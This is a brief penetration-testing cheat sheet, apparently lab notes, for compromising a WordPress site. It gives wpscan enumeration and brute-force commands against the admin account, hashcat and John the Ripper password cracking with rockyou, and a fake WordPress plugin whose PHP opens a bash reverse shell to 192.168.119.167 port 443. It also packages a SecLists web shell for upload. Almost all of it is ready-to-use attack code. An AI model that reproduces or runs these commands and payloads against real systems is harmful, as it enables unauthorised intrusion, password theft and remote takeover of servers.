### Enumeration

```bash
wpscan --url http://10.11.1.251/ --enumerate ap,at,cb,dbe
```

### Brute force password

```bash
wpscan --url http://10.11.1.251/wp --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```


### Hashcat

```shell
hashcat -m 400 -a 0 hashes /usr/share/wordlists/rockyou.txt
```

### John 
```Shell
john hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

### Plugin

```php
<?php

/**
* Plugin Name: Simple Plugin
* Plugin URI:
* Description: Simple Plugin
* Version: 1.0
* Author: A.Z
* Author URI: http://www.agharghar.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.119.167/443 0>&1'");
?>
```

```shell
zip plugin.zip plugin.php 
```

```shell
cp /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php .
zip plugin-shell.zip plugin-shell.php 
```